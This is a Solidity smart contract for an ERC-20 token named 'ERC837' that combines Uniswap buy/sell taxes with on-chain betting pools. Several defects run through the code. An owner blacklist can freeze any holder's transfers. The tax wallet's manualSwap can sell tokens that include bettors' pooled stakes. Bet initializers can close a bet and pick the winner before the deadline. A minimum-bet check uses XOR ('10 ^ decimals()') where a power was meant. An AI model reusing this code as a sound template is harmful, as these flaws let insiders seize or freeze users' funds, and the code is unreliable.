// SPDX-License-Identifier: MIT

pragma solidity 0.8.27;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ERC837 is Context, IERC20, Ownable {

    using Counters for Counters.Counter;
    using SafeMath for uint256;

    // ======================================================================== [ STORAGE ] ======================================================================== //

    // The struct handling the bets.
    struct Bet {
        address initializer; // @notice The address that initializes the bet.
        string title; // @notice The title of the bet.
        uint256 deadlineBlock; // @notice The block that closes the bet.
        string[] options; // @notice The available options to bet on.
        address[] walletsBets; // @notice This array keeps track of all the wallets that bet.
        mapping(address => uint256) chosenBet; // @notice This mapping keeps track of the option the wallet bet on.
        mapping(address => uint256) balanceBet; // @notice This mapping keeps track of the bets balance placed by every wallet.
        uint256 balance; // @notice The balance stored in the bet.
        bool closed; // @notice If the bet was closed by the initializer.
    }

    Counters.Counter public atBet; // @notice Counter that keeps track of the last bet.
    mapping(uint256 => Bet) public allBets; // @notice Mapping that stores all the bets.
    uint256 public MIN_DEADLINE_DURATION = 300; // @notice The minimum deadline value for the bets.
    uint256 public MAX_BET_OPTIONS = 3; // @notice The maximum amount of options available per bet.
    uint256 public CLOSING_FEE = 5; // @notice The fee kept by the contract in tokens on bet closing. (%)

    /**
     * @notice Event emitted when a new bet is created.
     * @param betId The returned ID of the bet.
     * @param initializer The address of the initializer.
     * @param title The title of the bet.
     * @param options The available options the users can bet on.
     * @param deadlineBlock The block number at which betting will end.
     */
    event BetCreated(uint256 indexed betId, address initializer, string title, string[] options, uint256 deadlineBlock);

    /**
     * @notice Event emitted when a bet is closed.
     * @param betId The ID of the bet.
     * @param initializer The address of the initializer that closes the bet.
     * @param winningOption The option that won the bet.
     */
    event BetClosed(uint256 indexed betId, address initializer, uint256 winningOption);

    
    /**
     * @notice Event emitted when a bet is placed by an user.
     * @param betId The ID of the bet.
     * @param wallet The address of the user that places the bet.
     * @param option The user's betting option.
     */
    event BetPlaced(uint256 indexed betId, address wallet, uint256 option);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _taxWallet;
    string private constant _name = unicode'ERC837';
    string private constant _symbol = unicode'BET';

    uint256 private _initialBuyTax=19;
    uint256 private _initialSellTax=19;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=30;
    uint256 private _reduceSellTaxAt=30;
    uint256 private _preventSwapBefore=36;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10000 * 10**_decimals;
    uint256 public _maxTxAmount = 200 * 10**_decimals;
    uint256 public _maxWalletSize = 200 * 10**_decimals;
    uint256 public _taxSwapThreshold= 100 * 10**_decimals;
    uint256 public _maxTaxSwap= 100 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true; 

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    // ======================================================================== [ SETTERS ] ======================================================================== //

    /*
    @notice This function is used by the administrator to change the minimum deadline duration.
    @param duration The new minimum deadline duration.
    */
    function setMinDeadlineDuration(uint256 duration) external onlyOwner {
        MIN_DEADLINE_DURATION = duration;
    }

    /*
    @notice This function is used by the administrator to change the maximum betting options.
    @param duration The new maximum betting options.
    */
    function setMaxBetOptions(uint256 options) external onlyOwner {
        MAX_BET_OPTIONS = options;
    }

    /*
    @notice This function is used by the administrator to change the closing fee.
    @param duration The new closing fee.
    */
    function setClosingFee(uint8 fee) external onlyOwner {
        require(fee >= 0 && fee <= 10, "ERC837: Invalid fee.");
        CLOSING_FEE = fee;
    }

    // ======================================================================== [ GETTERS ] ======================================================================== //

    /*
    @notice This function is used internally to retrieve a bet.
    @param betId The id of the bet.
    @return the bet at the specified id.
    */
    function getBet(uint256 betId) private view returns (Bet storage) {
        Bet storage returnedBet = allBets[betId];
        require(returnedBet.initializer != address(0), "ERC837: Bet does not exist.");
        return returnedBet;
    }

    /*
    @notice This function is used to retrieve the bet's initializer.
    @param betId The id of the bet.
    @return the address of the initializer.
    */
    function getBetInitializer(uint256 betId) public view returns (address) {
        return getBet(betId).initializer;
    }

    /*
    @notice This function is used to retrieve the bet's title.
    @param betId The id of the bet.
    @return the title.
    */
    function getBetTitle(uint256 betId) public view returns (string memory) {
        return getBet(betId).title;
    }

    /*
    @notice This function is used to retrieve the bet's deadline block.
    @param betId The id of the bet.
    @return the bet's deadline block.
    */
    function getBetDeadlineBlock(uint256 betId) public view returns (uint256) {
        return getBet(betId).deadlineBlock;
    }

    /*
    @notice This function is used to retrieve the bet's options.
    @param betId The id of the bet.
    @return the bet's options.
    */
    function getBetOptions(uint256 betId) public view returns (string[] memory) {
        return getBet(betId).options;
    }

    /*
    @notice This function is used to retrieve the bet's betters.
    @param betId The id of the bet.
    @return an array with all the betters of a specific bet.
    */
    function getBetters(uint256 betId) public view returns (address[] memory) {
        return getBet(betId).walletsBets;
    }

    /*
    @notice This function is used to retrieve the bet's options.
    @param betId The id of the bet.
    @return the options of a bet.
    */
    function getWalletBetOption(uint256 betId, address wallet) public view returns (uint256) {
        return getBet(betId).chosenBet[wallet];
    }

    /*
    @notice This function is used to retrieve the bet's pooled balance.
    @param betId The id of the bet.
    @return the pooled tokens in a bet.
    */
    function getBetPooledBalance(uint256 betId) public view returns (uint256) {
        return getBet(betId).balance;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    // ======================================================================== [ LOGIC ] ======================================================================== //

    /*
    @notice This function allows an user to create a bet.
    @param _title The title of the bet.
    @param _options A string array with all the available options to bet on.
    @param deadline The deadline block of the bet.
    */
    function createBet(string memory _title, string[] memory _options, uint256 deadline) payable external returns(uint256 id) {
        require(balanceOf(msg.sender) > 0, "ERC837: Only token holders can create bets.");
        require(deadline >= MIN_DEADLINE_DURATION, "ERC837: Deadline too short.");
        require(bytes(_title).length <= 50, "ERC837: Title cannot be longer than 50 characters.");
        require(_options.length >= 2 && _options.length <= MAX_BET_OPTIONS, "ERC837: Invalid amount of options.");

        id = atBet.current();

        uint256 deadlineBlock = block.number + deadline;


        allBets[id].initializer = msg.sender;
        allBets[id].title = _title;
        allBets[id].deadlineBlock = deadlineBlock;
        allBets[id].options = _options;
        allBets[id].balance = 0;
        allBets[id].closed = false;

        atBet.increment();

        emit BetCreated(id, msg.sender, _title, _options, deadlineBlock);
    }

    /*
    @notice This function allows the initializer of the bet to close it and pay the winning wallets.
    @param betId The id of the bet.
    @param option The winning option.
    */
    function closeBet(uint256 betId, uint256 option) external {
        Bet storage returnedBet = getBet(betId);
        require(returnedBet.initializer == msg.sender, "ERC837: Sender not initializer.");
        require(returnedBet.deadlineBlock >= block.number, "ERC837: This bet is still locked.");
        require(!returnedBet.closed, "ERC837: This bet is already closed.");
        require(option >= 0 && option < returnedBet.options.length, "ERC837: Invalid option.");

        if(returnedBet.walletsBets.length > 0) {
            uint256 balOnWinningOption = getBalancePlacedOnOption(betId, option);
            uint256 availableWinningsAfterFee = returnedBet.balance - ((returnedBet.balance * CLOSING_FEE) / 100);

            for(uint256 i = 0; i < returnedBet.walletsBets.length; i++) {
                address wallet = returnedBet.walletsBets[i];
                if(returnedBet.chosenBet[wallet] == option) {
                    uint256 walletBetPercentageFromWinning = returnedBet.balanceBet[wallet] * 100 / balOnWinningOption;
                    uint256 walletWinnings = (availableWinningsAfterFee * walletBetPercentageFromWinning) / 100;

                    _transfer(address(this), wallet, walletWinnings);
                }
            }
        }

        returnedBet.closed = true;
        emit BetClosed(betId, returnedBet.initializer, option);
    }

    /*
    @notice This function allows the users to place a specific bet.
    @param betId The id of the bet.
    @param option The betting option.
    @param betBalance The amount of tokens to bet.
    */
    function placeBet(uint256 betId, uint256 option, uint256 betBalance) external {
        require(balanceOf(msg.sender) > 0, "ERC837: Only token holders can place bets.");

        Bet storage returnedBet = getBet(betId);
        require(!isBetPlacedByWallet(betId, msg.sender), "ERC837: Only 1 bet allowed per wallet.");
        require(option >= 0 && option < returnedBet.options.length, "ERC837: Invalid option for bet.");
        require(betBalance >= 1 * (10 ^ decimals()), "ERC837: Bet balance must be higher than 1 token.");
        require(balanceOf(msg.sender) >= betBalance, "ERC837: Not enough tokens to bet.");

        returnedBet.walletsBets.push(msg.sender);
        returnedBet.chosenBet[msg.sender] = option;
        returnedBet.balanceBet[msg.sender] = betBalance;
        returnedBet.balance += betBalance;
        _transfer(msg.sender, address(this), betBalance);
    }

    /*
    @notice This function is used internally to get the balance placed on a specific option.
    @param betId The id of the bet.
    @param option The option to check for.
    @return the balance bet on the specific option.
    */
    function getBalancePlacedOnOption(uint256 betId, uint256 option) private view returns(uint256 balance) {
        balance = 0;
        Bet storage returnedBet = getBet(betId);
        for(uint256 i = 0; i < returnedBet.walletsBets.length; i++) {
            address wallet = returnedBet.walletsBets[i];
            if(returnedBet.chosenBet[wallet] == option)
                balance += returnedBet.balanceBet[wallet];
        }
    }

    /*
    @notice This function is used internally to check if a wallet placed a bet on a specific id.
    @param betId The id of the bet.
    @return true if the wallet placed a bet on the specific id | false if the wallet didn't place a bet on the specific id.
    */
    function isBetPlacedByWallet(uint256 betId, address wallet) private view returns(bool) {
        Bet storage returnedBet = getBet(betId);
        for(uint256 i = 0; i < returnedBet.walletsBets.length; i++) {
            if(returnedBet.walletsBets[i] == wallet)
                return true;
        }
        return false;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 4, "Only 4 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function openTrading() public onlyOwner() {
        require(!tradingOpen, "trading is already open"); 
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        _approve(address(this), msg.sender, type(uint256).max);
        transfer(address(this), balanceOf(msg.sender).mul(98).div(100)); 
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); 
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); 
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        swapEnabled = true; 
        tradingOpen = true; 
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function manualsend() external {
        require(_msgSender()==_taxWallet);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }
}
